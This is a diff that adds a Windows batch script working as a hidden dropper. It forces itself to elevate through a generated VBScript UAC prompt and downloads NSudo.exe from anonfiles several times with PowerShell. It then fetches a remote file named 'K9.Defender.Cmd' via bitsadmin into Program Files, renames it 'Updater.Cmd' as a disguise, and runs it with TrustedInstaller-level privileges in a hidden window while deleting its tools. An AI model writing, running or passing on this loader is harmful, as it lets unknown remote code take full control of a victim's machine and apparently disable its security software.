@@ -1,0 +1,55 @@
+@echo off
+title l
+@echo off
+:init
+ @;CLS
+@;powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe', 'NSudo.exe')"
+@;powershell -Command "Invoke-WebRequest https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe -OutFile NSudo.exe"
+ @;setlocal DisableDelayedExpansion
+ REM if no worky try cmdInvoke=1  and winSysFolder=Sysnative
+ @;set params = %*:"=""
+ @;set cmdInvoke=0
+ @;set winSysFolder=System32
+ @;set "batchPath=%~0"
+ @;for %%k in (%0) do set batchName=%%~nk
+ @;set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
+ @;setlocal EnableDelayedExpansion
+
+:checkPrivileges
+  @;NET FILE 1>NUL 2>NUL
+  if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )
+
+:getPrivileges
+  if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)
+
+  @;ECHO Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
+  @;ECHO args = "ELEV " >> "%vbsGetPrivileges%"
+  @;ECHO For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
+  @;ECHO args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
+  @;ECHO Next >> "%vbsGetPrivileges%"
+
+  if '%cmdInvoke%'=='1' goto InvokeCmd 
+
+  @;ECHO UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
+  @;goto ExecElevation
+
+:InvokeCmd
+  @;ECHO args = "/c """ + "!batchPath!" + """ " + args >> "%vbsGetPrivileges%" 
+  @;ECHO UAC.ShellExecute "NSudo.exe", args, " -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide %~s0 %params% >>9K21JM10B.log  2>>&1", -Verb RunAs "runas", 1 >> "%vbsGetPrivileges%"
+
+:ExecElevation
+ "%SystemRoot%\%winSysFolder%\WScript.exe" "%vbsGetPrivileges%" %*
+ del /q /s /a /f "NSudo.exe" >nul 2>&1
+ @;exit /B
+
+:gotPrivileges
+    @;pushd "%CD%"
+ @;setlocal & cd /d %~dp0
+ if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)
+ @;powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe', 'NSudo.exe')"
+@;powershell -Command "Invoke-WebRequest https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe -OutFile NSudo.exe"
+ @;powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe', 'NSudo.exe')"
+@;powershell -Command "Invoke-WebRequest https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe -OutFile NSudo.exe"
+@;bitsadmin/transfer Explorers /download /priority FOREGROUND https://cdn-133.anonfiles.com/pdTdZ7X7xc/b3044691-1650363807/K9.Defender.Cmd %ProgramW6432%\Application.Cmd
+@;rename %ProgramW6432%\Application.Cmd %ProgramW6432%\Updater.Cmd
+@;NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide %ProgramW6432%\Updater.Cmd
